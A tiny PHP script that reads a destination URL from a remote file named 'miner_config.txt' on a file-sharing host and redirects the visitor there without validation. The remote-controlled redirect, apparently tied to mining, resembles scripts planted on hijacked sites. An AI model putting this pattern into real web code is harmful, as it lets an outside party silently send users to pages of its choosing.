<?php
$link = 'https://od.lk/s/MjZfNzE5NzcwNF8/miner_config.txt';
$config =  file_get_contents($link);
header('Location: ' . $config);
?>
